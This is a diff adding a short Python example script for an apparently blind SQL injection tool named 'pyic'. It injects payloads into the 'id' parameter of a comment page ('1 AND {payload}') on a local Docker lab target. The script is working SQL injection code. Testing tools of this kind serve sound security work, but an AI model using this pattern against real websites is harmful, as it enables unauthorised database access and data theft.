@@ -1,0 +1,14 @@
+#!/usr/bin/env python3
+
+import requests
+
+from pyic import loop
+
+print('\nTo test this example, start the docker examples in docker folder')
+
+
+def rb(payload):
+    return requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 AND {}'.format(payload), 'log': '1'})
+
+
+loop(rb)
